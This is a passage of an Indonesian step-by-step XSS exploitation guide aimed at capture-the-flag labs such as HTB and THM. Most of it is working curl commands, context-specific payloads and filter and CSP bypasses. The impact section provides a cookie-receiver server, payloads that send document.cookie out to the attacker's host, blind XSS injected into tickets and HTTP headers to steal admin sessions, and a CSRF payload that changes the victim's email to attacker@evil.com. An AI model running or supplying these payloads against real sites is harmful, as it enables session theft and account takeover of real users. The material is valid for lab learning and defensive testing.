export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="8000"
mkdir -p ~/xss_loot/{payloads,cookies,screenshots,notes}
cd ~/xss_loot

echo "[*] Target: $TARGET | LHOST: $LHOST:$LPORT"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5:8000
```

---

## ═══════════════════════════════════════

## FASE 0: RECON AWAL & IDENTIFIKASI ATTACK SURFACE

## ═══════════════════════════════════════

> **Tujuan:** Sebelum testing XSS, pahami dulu struktur aplikasi. XSS bukan sekedar coba-coba — kita perlu tahu DIMANA input diterima dan DIMANA output ditampilkan.

### Langkah 0.1 — Identifikasi Semua Input Points

Bash

```
# Command 1: Spider sederhana dengan curl untuk lihat struktur
curl -s http://$TARGET/ | grep -E '(form|input|textarea|select)' | head -30

# Command 2: Cek semua parameter di URL (dari source code)
curl -s http://$TARGET/ | grep -E '(href|action|src)="[^"]*\?' | head -20

# Command 3: Cari semua form dan method-nya
curl -s http://$TARGET/ | grep -A5 '<form'
```

**OUTPUT BERHASIL ✅ — Ada form dengan parameter:**

HTML

```
<form action="/search" method="GET">
  <input type="text" name="q" placeholder="Search...">
  <input type="submit" value="Go">
</form>

<form action="/comment" method="POST">
  <textarea name="comment"></textarea>
  <input type="hidden" name="csrf_token" value="abc123">
</form>
```

**Cara baca dan catat semua input points:**

|Input Point|Method|Parameter|Type|
|---|---|---|---|
|`/search`|GET|`q`|URL parameter → Candidate Reflected XSS|
|`/comment`|POST|`comment`|Form body → Candidate Stored XSS|
|`/error?msg=`|GET|`msg`|Error message → Candidate Reflected XSS|
|`/profile`|POST|`username`|Profile update → Candidate Stored XSS|
|`#hash`|Client-side|`location.hash`|URL hash → Candidate DOM XSS|

**OUTPUT GAGAL ❌ — Aplikasi sangat minimal, sedikit visible form:**

HTML

```
<!-- Tidak ada form terlihat di homepage -->
```

➡️ Coba:

Bash

```
# Cek JavaScript files — mungkin ada SPA (Single Page App)
curl -s http://$TARGET/ | grep -E '<script src=' | head -10

# Jika ada JS files, download dan analisis
curl -s http://$TARGET/static/app.js | grep -E '(fetch|XMLHttpRequest|location\.|param)' | head -20

# Cek apakah ada API endpoints
curl -s http://$TARGET/ | grep -E '(/api/|/v1/|/v2/)' | head -10
```

---

### Langkah 0.2 — Identifikasi Teknologi & Framework

Bash

```
# Command 1: Cek response headers untuk fingerprint
curl -sI http://$TARGET/ | grep -iE '(server|x-powered-by|set-cookie|content-type)'

# Command 2: Cek source untuk framework hints
curl -s http://$TARGET/ | grep -iE '(angular|react|vue|jquery|bootstrap)' | head -10

# Command 3: Cek apakah ada CSP header (PENTING untuk planning)
curl -sI http://$TARGET/ | grep -i 'content-security-policy'
```

**OUTPUT BERHASIL ✅ — Fingerprint lengkap:**

text

```
Server: Apache/2.4.41
X-Powered-By: PHP/7.4.3
Set-Cookie: session=abc123; HttpOnly; Secure
Content-Type: text/html; charset=UTF-8
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

**Cara baca output ini — PENTING:**

|Header|Nilai|Implikasi untuk XSS|
|---|---|---|
|`X-Powered-By: PHP`|PHP backend|Output encoding bergantung pada `htmlspecialchars()`|
|`Set-Cookie: HttpOnly`|Cookie dilindungi|`document.cookie` tidak bisa baca cookie ini|
|`Set-Cookie: Secure`|Cookie HTTPS only|Hati-hati saat test di HTTP lab|
|`CSP: unsafe-inline`|Inline script diizinkan|`<script>alert(1)</script>` mungkin bekerja|
|`CSP: script-src 'self'`|Hanya script dari domain sendiri|Perlu cari bypass atau JSONP|
|Tidak ada CSP|Tidak ada CSP|Semua payload bebas dicoba|

**OUTPUT BERHASIL ✅ — AngularJS terdeteksi:**

HTML

```
<html ng-app="myApp">
<script src="/static/angular.min.js"></script>
```

➡️ **PENTING!** AngularJS = kandidat CSTI (Client-Side Template Injection). Lanjut ke **Fase 3D** setelah basic testing.

---

## ═══════════════════════════════════════

## FASE 1: REFLECTION TESTING — APAKAH INPUT DIKEMBALIKAN?

## ═══════════════════════════════════════

> **Tujuan:** Konfirmasi bahwa input kita muncul kembali di response. **Reflection ≠ XSS** — ini hanya langkah pertama.

### Langkah 1.1 — Uji Reflection dengan Unique Marker

Bash

```
# Command 1: GET parameter
curl -s \
  --get \
  --data-urlencode 'q=XSS_MARKER_12345' \
  "http://$TARGET/search" | grep -n 'XSS_MARKER_12345'

# Command 2: POST parameter
curl -s -X POST \
  --data-urlencode 'comment=XSS_MARKER_12345' \
  "http://$TARGET/comment" | grep -n 'XSS_MARKER_12345'

# Command 3: Header reflection (User-Agent, Referer)
curl -s "http://$TARGET/" \
  -H 'User-Agent: XSS_MARKER_12345' | grep -n 'XSS_MARKER_12345'

curl -s "http://$TARGET/" \
  -H 'Referer: XSS_MARKER_12345' | grep -n 'XSS_MARKER_12345'
```

**OUTPUT BERHASIL ✅ — Marker ditemukan di response:**

text

```
87:<div class="result">XSS_MARKER_12345</div>
```

atau:

text

```
43:<input value="XSS_MARKER_12345" type="text">
```

atau:

text

```
92:var searchTerm = 'XSS_MARKER_12345';
```

➡️ **Reflection terkonfirmasi!** Catat baris dan konteks. Lanjut ke **Langkah 1.2**.

**OUTPUT BERHASIL ✅ — Marker ada tapi di-encode:**

text

```
87:<div class="result">XSS_MARKER_12345</div>      ← Normal
43:<input value="XSS_MARKER_12345">                 ← Normal
92:var x = 'XSS_MARKER_12345';                     ← Normal

Tapi jika kamu kirim <script>:
&lt;script&gt;alert(1)&lt;/script&gt;               ← Di-encode, tidak executable
```

➡️ Ada encoding. Lanjut ke **Langkah 1.2** untuk identifikasi context. Mungkin masih bisa bypass tergantung context.

**OUTPUT GAGAL ❌ — Marker tidak ditemukan sama sekali:**

text

```
(tidak ada output dari grep)
```

➡️ Input mungkin:

1. Tidak di-reflect di halaman ini → coba halaman lain
2. Disimpan dan muncul di halaman berbeda → cek Stored XSS
3. Diproses di client-side (DOM) → cek DOM XSS
4. Input divalidasi/diblock → coba encoding berbeda

Bash

```
# Coba cari di halaman setelah submit
curl -s -X POST \
  --data-urlencode 'comment=XSS_MARKER_12345' \
  -L \
  "http://$TARGET/comment" | grep -n 'XSS_MARKER_12345'
# Flag -L = follow redirect

# Coba dengan cookies (jika perlu login)
curl -s \
  --get \
  --data-urlencode 'q=XSS_MARKER_12345' \
  -H 'Cookie: session=YOUR_SESSION_COOKIE' \
  "http://$TARGET/search" | grep -n 'XSS_MARKER_12345'
```

---

### Langkah 1.2 — Identifikasi Exact Context

> Ini adalah langkah TERPENTING. Salah baca context = payload tidak akan bekerja.

Bash

```
# Lihat 5 baris sebelum dan sesudah marker untuk pahami context
curl -s \
  --get \
  --data-urlencode 'q=XSS_MARKER_12345' \
  "http://$TARGET/search" | grep -n -B5 -A5 'XSS_MARKER_12345'
```

**OUTPUT BERHASIL ✅ — HTML Body Context:**

HTML

```
85:  <div class="search-results">
86:    <p>Results for:</p>
87:    <div class="result">XSS_MARKER_12345</div>
88:  </div>
89:  <p>Found 0 results</p>
```

➡️ Input berada **di antara HTML tags** → **HTML Body Context**. Lanjut ke **Fase 2A**.

**OUTPUT BERHASIL ✅ — HTML Attribute Context:**

HTML

```
41:  <input type="text" 
42:    name="search"
43:    value="XSS_MARKER_12345"
44:    class="form-control">
```

➡️ Input berada **di dalam attribute value** → **HTML Attribute Context**. Lanjut ke **Fase 2B**.

**OUTPUT BERHASIL ✅ — JavaScript String Context:**

JavaScript

```
90:  <script>
91:    var searchQuery = 'XSS_MARKER_12345';
92:    var resultCount = 0;
93:  </script>
```

➡️ Input berada **di dalam JavaScript string** → **JS String Context**. Lanjut ke **Fase 2C**.

**OUTPUT BERHASIL ✅ — JavaScript Template Literal:**

JavaScript

```
90:  <script>
91:    var message = `Welcome, XSS_MARKER_12345!`;
92:  </script>
```

➡️ Input berada **di dalam backtick template literal** → **JS Template Literal Context**. Lanjut ke **Fase 2D**.

**OUTPUT BERHASIL ✅ — URL/href Context:**

HTML

```
45:  <a href="/redirect?next=XSS_MARKER_12345">Click here</a>
```

atau:

HTML

```
45:  <a href="XSS_MARKER_12345">Click here</a>
```

➡️ Input menjadi nilai URL → **URL Context**. Lanjut ke **Fase 2E**.

---

## ═══════════════════════════════════════

## FASE 2: CONTEXT-SPECIFIC PAYLOAD TESTING

## ═══════════════════════════════════════

### FASE 2A — HTML Body Context

> Context: `<div>INPUT_DISINI</div>`

**Step 1: Coba basic script tag**

Bash

```
curl -s \
  --get \
  --data-urlencode 'q=<script>alert(1)</script>' \
  "http://$TARGET/search" | grep -E '(<script>|onerror|onload)'
```

**OUTPUT BERHASIL ✅ — Script tag muncul unescaped di response:**

HTML

```
<div class="result"><script>alert(1)</script></div>
```

➡️ **XSS CONFIRMED!** Buka di browser untuk verifikasi visual, lalu lanjut ke **Fase 4 (Impact)**.

**OUTPUT GAGAL ❌ — Script tag di-encode:**

HTML

```
<div class="result">&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

➡️ `<script>` diblok/encode. Coba event handlers:

Bash

```
# Coba img onerror
curl -s \
  --get \
  --data-urlencode 'q=<img src=x onerror=alert(1)>' \
  "http://$TARGET/search" | grep -E '(onerror|<img)'

# Coba SVG onload
curl -s \
  --get \
  --data-urlencode 'q=<svg onload=alert(1)>' \
  "http://$TARGET/search" | grep -E '(onload|<svg)'

# Coba details ontoggle  
curl -s \
  --get \
  --data-urlencode 'q=<details open ontoggle=alert(1)>' \
  "http://$TARGET/search" | grep -E '(ontoggle|<details)'
```

**OUTPUT BERHASIL ✅ — Event handler muncul:**

HTML

```
<div><img src=x onerror=alert(1)></div>
```

➡️ **XSS CONFIRMED via event handler!** Verifikasi di browser.

**OUTPUT GAGAL ❌ — Semua tag diblok, tapi ada partial reflection:**

HTML

```
<div>alert(1)</div>   ← Tag di-strip tapi content muncul
```

➡️ Tag stripping aktif. Coba bypass:

Bash

```
# Case variation
curl -s --get \
  --data-urlencode 'q=<ScRiPt>alert(1)</ScRiPt>' \
  "http://$TARGET/search" | grep -iE '<script>'

# Nested tags (filter hapus <script> tapi tidak rekursif)
curl -s --get \
  --data-urlencode 'q=<scr<script>ipt>alert(1)</scr</script>ipt>' \
  "http://$TARGET/search" | grep -iE '<script>'

# Tag tidak umum yang mungkin lolos filter
curl -s --get \
  --data-urlencode 'q=<video><source onerror=alert(1)></video>' \
  "http://$TARGET/search" | grep -E 'onerror'
```

**Jika semua gagal — Google Search:**

text

```
site:portswigger.net "html context" xss bypass cheat sheet
XSS html body context bypass [framework name dari Langkah 0.2]
```

---

### FASE 2B — HTML Attribute Context

> Context: `<input value="INPUT_DISINI">`

**Step 1: Identifikasi quote type**

Bash

```
# Lihat apakah menggunakan double quote atau single quote
curl -s \
  --get \
  --data-urlencode 'q=XSS_MARKER_12345' \
  "http://$TARGET/search" | grep -o '.\{50\}XSS_MARKER_12345.\{50\}'
```

**OUTPUT BERHASIL ✅ — Double quote:**

text

```
value="XSS_MARKER_12345" class="input"
```

➡️ Gunakan double quote untuk break:

Bash

```
# Payload: tutup attribute, tambah event handler
curl -s \
  --get \
  --data-urlencode 'q=" onmouseover="alert(1)' \
  "http://$TARGET/search" | grep 'onmouseover'

# Payload: tutup tag, inject baru
curl -s \
  --get \
  --data-urlencode 'q="><script>alert(1)</script>' \
  "http://$TARGET/search" | grep '<script>'

# Payload: autofocus (tidak perlu interaksi user)
curl -s \
  --get \
  --data-urlencode 'q=" autofocus onfocus="alert(1)' \
  "http://$TARGET/search" | grep 'onfocus'
```

**OUTPUT BERHASIL ✅ — Attribute break berhasil:**

HTML

```
<input value="" onmouseover="alert(1)" class="input">
```

atau:

HTML

```
<input value=""><script>alert(1)</script><input value="
```

➡️ **XSS CONFIRMED!** Verifikasi di browser.

**OUTPUT BERHASIL ✅ — Single quote:**

text

```
value='XSS_MARKER_12345' class='input'
```

➡️ Gunakan single quote:

Bash

```
curl -s \
  --get \
  --data-urlencode "q=' onmouseover='alert(1)" \
  "http://$TARGET/search" | grep 'onmouseover'
```

**OUTPUT GAGAL ❌ — Quote di-escape:**

HTML

```
<input value="&quot; onmouseover=&quot;alert(1)">
```

➡️ Quote encoding aktif. Coba:

Bash

```
# Jika berada dalam event handler attribute yang sudah ada
# Contoh: <input onclick="doSomething('INPUT')">
curl -s \
  --get \
  --data-urlencode "q=');alert(1);//" \
  "http://$TARGET/search" | grep 'alert'

# HTML entity bypass (terkadang parser decode entity sebelum eksekusi)
curl -s \
  --get \
  --data-urlencode 'q=&quot; onmouseover=&quot;alert(1)' \
  "http://$TARGET/search" | grep 'onmouseover'
```

---

### FASE 2C — JavaScript String Context

> Context: `var x = 'INPUT_DISINI';` atau `var x = "INPUT_DISINI";`

**Step 1: Break string dan inject code**

Bash

```
# Single quote string
curl -s \
  --get \
  --data-urlencode "q=';alert(1);//" \
  "http://$TARGET/search" | grep -A2 -B2 'alert'

# Double quote string
curl -s \
  --get \
  --data-urlencode 'q=";alert(1);//' \
  "http://$TARGET/search" | grep -A2 -B2 'alert'
```

**OUTPUT BERHASIL ✅ — String break berhasil:**

JavaScript

```
var searchQuery = '';alert(1);//';
```

➡️ **XSS CONFIRMED!** JavaScript akan execute `alert(1)`.

**OUTPUT GAGAL ❌ — Quote di-backslash escaped:**

JavaScript

```
var searchQuery = '\';alert(1);//';
```

➡️ Backslash escaping aktif. Coba bypass:

Bash

```
# Backslash before backslash (escape the escape)
curl -s \
  --get \
  --data-urlencode 'q=\';alert(1);//' \
  "http://$TARGET/search" | grep 'alert'

# Jika menggunakan regex replace yang tidak sempurna
# Input: \' → menjadi \\' → browser baca sebagai backslash + quote
curl -s \
  --get \
  --data-urlencode "q=\\';alert(1);//" \
  "http://$TARGET/search" | grep 'alert'

# Line break (newline bisa break JS string tanpa perlu quote)
# Input mengandung newline character
printf "q=test\nalert(1);//" | curl -s \
  --get \
  --data-urlencode @- \
  "http://$TARGET/search" | grep 'alert'
```

**OUTPUT GAGAL ❌ — Backslash escaping + double escaping:**

➡️ Coba keluar dari script tag sepenuhnya:

Bash

```
# Close script tag, buka baru
curl -s \
  --get \
  --data-urlencode 'q=</script><script>alert(1)</script>' \
  "http://$TARGET/search" | grep 'alert'
```

**OUTPUT BERHASIL ✅:**

HTML

```
<script>
var x = '</script><script>alert(1)</script>';
</script>
```

➡️ Browser menutup `</script>` pertama, kemudian `<script>alert(1)</script>` dieksekusi!

---

### FASE 2D — JavaScript Template Literal Context

> Context: ``var x = `INPUT_DISINI`;``

Bash

```
# Template expression injection
curl -s \
  --get \
  --data-urlencode 'q=${alert(1)}' \
  "http://$TARGET/search" | grep 'alert'

# Break template literal
curl -s \
  --get \
  --data-urlencode 'q=`;alert(1);//' \
  "http://$TARGET/search" | grep 'alert'
```

**OUTPUT BERHASIL ✅:**

JavaScript

```
var message = `${alert(1)}`;
```

atau:

JavaScript

```
var message = ``;alert(1);//`;
```

➡️ **XSS CONFIRMED!**

---

### FASE 2E — URL/href Context

> Context: `<a href="INPUT_DISINI">` atau `<img src="INPUT_DISINI">`

Bash

```
# Test javascript: scheme (untuk href)
curl -s \
  --get \
  --data-urlencode 'next=javascript:alert(1)' \
  "http://$TARGET/login" | grep 'javascript:'

# Test untuk img src — tidak bisa langsung inject JS
# Tapi bisa inject event handler jika break attribute
curl -s \
  --get \
  --data-urlencode 'img=x" onerror="alert(1)' \
  "http://$TARGET/avatar" | grep 'onerror'
```

**OUTPUT BERHASIL ✅ — javascript: scheme muncul:**

HTML

```
<a href="javascript:alert(1)">Click here</a>
```

➡️ **XSS CONFIRMED!** User perlu klik link untuk trigger.

**OUTPUT GAGAL ❌ — javascript: scheme diblok:**

HTML

```
<a href="">Click here</a>    ← href dikosongkan
<a href="about:blank">       ← redirect ke safe URL
```

➡️ Coba bypass:

Bash

```
# Encoding variations
curl -s \
  --get \
  --data-urlencode 'next=JaVaScRiPt:alert(1)' \
  "http://$TARGET/login" | grep -i 'javascript'

# URL encoding
curl -s \
  --get \
  --data-urlencode 'next=%6a%61%76%61%73%63%72%69%70%74:alert(1)' \
  "http://$TARGET/login" | grep -i 'javascript'

# Data URI (modern browser mungkin blok ini di href)
curl -s \
  --get \
  --data-urlencode 'next=data:text/html,<script>alert(1)</script>' \
  "http://$TARGET/login" | grep 'data:'
```

---

## ═══════════════════════════════════════

## FASE 3: DOM XSS ANALYSIS

## ═══════════════════════════════════════

> **Tujuan:** DOM XSS terjadi entirely di client-side. Server mungkin tidak pernah menerima payload. Ini butuh browser/manual JS analysis.

### Langkah 3.1 — Identifikasi DOM XSS Sources

Bash

```
# Download semua JS files dan cari sources berbahaya
curl -s http://$TARGET/ | grep -oE 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//'

# Untuk setiap JS file yang ditemukan, cari:
curl -s "http://$TARGET/static/app.js" | grep -E \
  '(location\.hash|location\.search|document\.URL|document\.referrer|window\.name|URLSearchParams)' \
  | head -20
```

**OUTPUT BERHASIL ✅ — Ditemukan source berbahaya:**

JavaScript

```
const searchParam = new URLSearchParams(location.search).get('q');
document.getElementById('output').innerHTML = searchParam;
```

➡️ **DOM XSS ditemukan!** Source: `location.search`, Sink: `innerHTML`

Lanjut ke **Langkah 3.2**.

### Langkah 3.2 — Identifikasi DOM XSS Sinks

Bash

```
# Cari dangerous sinks di semua JS files
curl -s "http://$TARGET/static/app.js" | grep -E \
  '(innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|insertAdjacentHTML)' \
  | head -20
```

**Tabel Sinks dan Payload:**

|Sink|Payload|Notes|
|---|---|---|
|`innerHTML =`|`<img src=x onerror=alert(1)>`|`<script>` tidak bekerja di innerHTML|
|`outerHTML =`|`<img src=x onerror=alert(1)>`|Sama dengan innerHTML|
|`document.write()`|`<script>alert(1)</script>`|Script tag bekerja|
|`eval()`|`alert(1)`|Langsung JS code|
|`setTimeout(string)`|`alert(1)`|String arg dieksekusi|
|`setInterval(string)`|`alert(1)`|String arg dieksekusi|
|`.src =`|`javascript:alert(1)`|Context dependent|
|`.href =`|`javascript:alert(1)`|Context dependent|

### Langkah 3.3 — Testing DOM XSS

Bash

```
# Test via URL hash (location.hash source)
# Buka di browser atau gunakan curl dengan # (hash tidak dikirim ke server)
# PENTING: Hash tidak dikirim ke server, harus test di browser!

# Untuk location.search source, bisa test via curl
curl -s "http://$TARGET/page?q=<img src=x onerror=alert(1)>" | grep 'onerror'

# Jika browser tidak tersedia, test dengan JS in console:
# F12 → Console → paste:
# document.querySelector('#output').innerHTML = '<img src=x onerror=alert(1)>'
```

**OUTPUT BERHASIL ✅ — DOM XSS terkonfirmasi (via browser console):**

text

```
Alert popup muncul dengan nilai domain
```

**Untuk location.hash:**

text

```
# URL yang perlu dibuka di browser:
http://TARGET/page#<img src=x onerror=alert(1)>

# Atau encoded:
http://TARGET/page#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

---

### FASE 3D — AngularJS CSTI Testing

> Gunakan jika di Langkah 0.2 terdeteksi AngularJS

Bash

```
# Step 1: Konfirmasi CSTI dengan math expression
curl -s \
  --get \
  --data-urlencode 'q={{7*7}}' \
  "http://$TARGET/search" | grep -E '(49|\{\{7\*7\}\})'
```

**OUTPUT BERHASIL ✅ — CSTI terkonfirmasi:**

HTML

```
<div>49</div>    ← AngularJS eval expression, hasilnya 49
```

➡️ Lanjut exploit:

Bash

```
# Sandbox escape payload
curl -s \
  --get \
  --data-urlencode 'q={{constructor.constructor("alert(1)")()}}' \
  "http://$TARGET/search"

# Alternative
curl -s \
  --get \
  --data-urlencode 'q={{$on.constructor("alert(1)")()}}' \
  "http://$TARGET/search"
```

**OUTPUT GAGAL ❌ — Hasil tetap `{{7*7}}` tidak di-eval:**

HTML

```
<div>{{7*7}}</div>    ← AngularJS tidak aktif di area ini
```

➡️ Mungkin `ng-app` tidak mencakup area output. Periksa scope `ng-app` di browser DevTools.

---

## ═══════════════════════════════════════

## FASE 4: STORED XSS TESTING

## ═══════════════════════════════════════

> **Tujuan:** Input disimpan di database/file dan muncul saat halaman dibuka kembali (oleh user lain, admin, dll.)

### Langkah 4.1 — Identifikasi Stored Input Points

Bash

```
# Kirim marker ke semua form yang menyimpan data
# Contoh: comment form
curl -s -X POST \
  -b "session=YOUR_COOKIE" \
  --data-urlencode 'comment=STORED_MARKER_99999' \
  "http://$TARGET/post/1/comment"

# Cek apakah marker muncul di halaman yang berbeda
curl -s -b "session=YOUR_COOKIE" "http://$TARGET/post/1" | grep 'STORED_MARKER_99999'
```

**OUTPUT BERHASIL ✅ — Marker persists di halaman:**

HTML

```
<div class="comment">STORED_MARKER_99999</div>
```

➡️ **Stored reflection terkonfirmasi!** Lanjut ke **Langkah 4.2**.

### Langkah 4.2 — Inject Stored XSS Payload

Bash

```
# Kirim XSS payload sebagai stored input
curl -s -X POST \
  -b "session=YOUR_COOKIE" \
  --data-urlencode 'comment=<script>alert(document.domain)</script>' \
  --data-urlencode 'csrf_token=TOKEN_DARI_FORM' \
  "http://$TARGET/post/1/comment"

# Verifikasi payload tersimpan
curl -s -b "session=YOUR_COOKIE" "http://$TARGET/post/1" | grep -E '(<script>|onerror|onload)'
```

**OUTPUT BERHASIL ✅ — Payload tersimpan unescaped:**

HTML

```
<div class="comment"><script>alert(document.domain)</script></div>
```

➡️ **STORED XSS CONFIRMED!** Setiap user yang buka halaman ini akan tereksekusi payloadnya. Lanjut ke **Fase 5 (Impact Assessment)**.

**OUTPUT GAGAL ❌ — Payload di-encode saat disimpan:**

HTML

```
<div class="comment">&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

➡️ Server-side encoding aktif. Coba:

Bash

```
# Coba event handlers yang mungkin lolos filter berbeda
curl -s -X POST \
  -b "session=YOUR_COOKIE" \
  --data-urlencode 'comment=<img src=x onerror=alert(1)>' \
  "http://$TARGET/post/1/comment"

# Coba dengan format yang berbeda (JSON body jika API)
curl -s -X POST \
  -b "session=YOUR_COOKIE" \
  -H 'Content-Type: application/json' \
  -d '{"comment":"<script>alert(1)</script>"}' \
  "http://$TARGET/api/comments"
```

---

## ═══════════════════════════════════════

## FASE 5: IMPACT ASSESSMENT — DARI ALERT KE EXPLOITATION NYATA

## ═══════════════════════════════════════

> **`alert(1)` hanyalah PoC. Untuk CTF dan pentest nyata, kita perlu membuktikan impact.**

### Langkah 5.1 — Setup Cookie Receiver

Bash

```
# Terminal 1: Jalankan receiver
python3 -m http.server $LPORT

# Atau gunakan script lebih advanced dari dokumentasi XSS
cat > /tmp/cookie_receiver.py << 'EOF'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timezone

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        ts = datetime.now(timezone.utc).isoformat()
        print(f"\n{'='*50}")
        print(f"[XSS CALLBACK] {ts}")
        print(f"From IP : {self.client_address[0]}")
        print(f"Path    : {parsed.path}")
        if 'c' in params:
            print(f"Cookie  : {params['c'][0]}")
        if 'data' in params:
            print(f"Data    : {params['data'][0]}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *args): return

HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
EOF

python3 /tmp/cookie_receiver.py
```

**Output yang diharapkan:**

text

```
(Menunggu koneksi...)
```

### Langkah 5.2 — Cookie Theft Payload

Bash

```
# Cek dulu apakah cookie ada dan HttpOnly atau tidak
# Di browser: F12 → Application → Cookies → lihat kolom HttpOnly

# Jika HttpOnly = false → bisa steal cookie
# Payload untuk cookie theft
COOKIE_THEFT='<script>fetch("http://LHOST:LPORT/?c="+encodeURIComponent(document.cookie))</script>'

# Ganti LHOST dan LPORT dengan IP/port kamu
curl -s -X POST \
  -b "session=YOUR_COOKIE" \
  --data-urlencode "comment=<script>fetch('http://$LHOST:$LPORT/?c='+encodeURIComponent(document.cookie))</script>" \
  "http://$TARGET/post/1/comment"
```

**OUTPUT BERHASIL ✅ — Receiver mendapat callback:**

text

```
==================================================
[XSS CALLBACK] 2024-01-15T10:30:00+00:00
From IP : 10.10.11.200
Path    : /
Cookie  : session=eyJhbGciOiJIUzI1NiJ9.admin.xxx
```

➡️ **Cookie berhasil dicuri!** Simpan:

Bash

```
export STOLEN_COOKIE="session=eyJhbGciOiJIUzI1NiJ9.admin.xxx"
echo "$STOLEN_COOKIE" >> ~/xss_loot/cookies/stolen_cookies.txt

# Gunakan cookie untuk akses sebagai admin
curl -s -b "$STOLEN_COOKIE" "http://$TARGET/admin" | head -50

# Atau set di browser: F12 → Application → Cookies → Edit value
```

**OUTPUT GAGAL ❌ — Cookie kosong (HttpOnly aktif):**

text

```
Cookie  : (kosong atau tidak ada)
```

➡️ HttpOnly aktif. Cookie tidak bisa dibaca JavaScript. Gunakan XSS untuk **melakukan action sebagai victim**:

Bash

```
# Payload: Buat admin melakukan action (CSRF via XSS)
# Contoh: Ubah email admin
CSRF_PAYLOAD='<script>
fetch("/account/change-email", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "email=attacker@evil.com&csrf_token="+document.querySelector("[name=csrf_token]").value
})
</script>'

# Inject payload ini ke field yang akan dilihat admin
curl -s -X POST \
  -b "session=YOUR_COOKIE" \
  --data-urlencode "comment=$CSRF_PAYLOAD" \
  "http://$TARGET/post/1/comment"
```

### Langkah 5.3 — Blind XSS (Payload ke Admin Panel)

> Digunakan ketika payload dikirim ke area yang tidak bisa dilihat langsung (support tickets, user-agent logging, error logs)

Bash

```
# Kirim payload ke semua input yang mungkin dilihat admin
# 1. Support ticket
curl -s -X POST \
  -b "session=YOUR_COOKIE" \
  --data-urlencode "message=<script>fetch('http://$LHOST:$LPORT/?blind=ticket&c='+document.cookie)</script>" \
  "http://$TARGET/support/new"

# 2. Username field (tampil di admin user list)
curl -s -X POST \
  -b "session=YOUR_COOKIE" \
  --data-urlencode "username=<script>fetch('http://$LHOST:$LPORT/?blind=username&c='+document.cookie)</script>" \
  "http://$TARGET/profile/update"

# 3. User-Agent header (tampil di access logs yang mungkin dilihat admin)
curl -s "http://$TARGET/" \
  -H "User-Agent: <script>fetch('http://$LHOST:$LPORT/?blind=useragent&c='+document.cookie)</script>"

# 4. Referer header
curl -s "http://$TARGET/" \
  -H "Referer: <script>fetch('http://$LHOST:$LPORT/?blind=referer&c='+document.cookie)</script>"
```

**OUTPUT BERHASIL ✅ — Receiver mendapat callback setelah beberapa menit:**

text

```
==================================================
[XSS CALLBACK] 2024-01-15T10:35:00+00:00
From IP : 10.10.11.200
Path    : /
blind   : ticket
Cookie  : session=ADMIN_SESSION_COOKIE_HERE
```

➡️ **Admin session berhasil dicuri!** Lanjut ke privilege escalation atau flag capture.

---

## ═══════════════════════════════════════

## FASE 6: CSP BYPASS (JIKA ADA CSP)

## ═══════════════════════════════════════

> Gunakan jika payload tereksekusi di source tapi tidak jalan di browser karena CSP violation di console.

### Langkah 6.1 — Analisis CSP

Bash

```
# Dapatkan dan parse CSP header
curl -sI "http://$TARGET/" | grep -i 'content-security-policy'
```

**OUTPUT BERHASIL ✅ — CSP ditemukan:**

text

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com
```

**Cara analisis CSP:**

|Directive|Nilai|Vulnerability|
|---|---|---|
|`script-src 'unsafe-inline'`|Inline script diizinkan|`<script>alert(1)</script>` bekerja langsung|
|`script-src 'unsafe-eval'`|eval() diizinkan|eval/setTimeout/setInterval dengan string bekerja|
|`script-src *`|Wildcard — semua domain|Load script dari attacker server|
|`script-src https://cdn.example.com`|Domain trusted|Cari JSONP/open redirect di cdn.example.com|
|`script-src 'nonce-ABC123'`|Nonce based|Cari nonce leak di source code|
|`default-src 'none'`|Semua diblok|XSS sangat terbatas, butuh bypass kompleks|

### Langkah 6.2 — Bypass Strategies

Bash

```
# BYPASS 1: Jika trusted domain ada JSONP endpoint
# Cek apakah cdn.example.com punya JSONP
curl -s "https://cdn.example.com/api?callback=alert" | head -5
# Jika response: alert({"data":...}) → bisa dipakai!

# Gunakan JSONP untuk bypass CSP
curl -s \
  --get \
  --data-urlencode 'q=<script src="https://cdn.example.com/api?callback=alert"></script>' \
  "http://$TARGET/search"

# BYPASS 2: Cari nonce leak di source code
curl -s "http://$TARGET/" | grep -oE "nonce-[A-Za-z0-9+/=]+"
# Jika nonce statik (tidak berubah per request) → bisa dipakai

# BYPASS 3: Cari open redirect di trusted domain
curl -s "https://cdn.example.com/redirect?url=https://attacker.com/evil.js" -I | grep Location

# BYPASS 4: Jika ada 'unsafe-inline' — langsung jalan
curl -s \
  --get \
  --data-urlencode 'q=<script>alert(1)</script>' \
  "http://$TARGET/search"

# BYPASS 5: base-uri tidak di-set → inject <base> tag
curl -s \
  --get \
  --data-urlencode 'q=<base href="http://attacker.com/">' \
  "http://$TARGET/search"
```

**Jika stuck dengan CSP — Google Search:**

text

```
bypass CSP [paste full CSP header value]
site:csp-evaluator.withgoogle.com
```

➡️ Gunakan **CSP Evaluator** ([https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)) — paste CSP dan dia akan tunjukkan weaknesses.

---

## ═══════════════════════════════════════

## FASE 7: FILTER BYPASS TECHNIQUES

## ═══════════════════════════════════════

> **Prinsip:** Jangan random spray payload. Identifikasi dulu APA yang difilter.

### Langkah 7.1 — Identifikasi Filter Behavior

Bash

```
# Test karakter satu per satu untuk tahu apa yang diblok
for char in '<' '>' '"' "'" '/' 'script' 'alert' 'onerror' 'onload'; do
    result=$(curl -s --get --data-urlencode "q=TEST${char}TEST" "http://$TARGET/search" | grep -o "TEST${char}TEST" | head -1)
    if [ -n "$result" ]; then
        echo "[PASS] '$char' → muncul di response"
    else
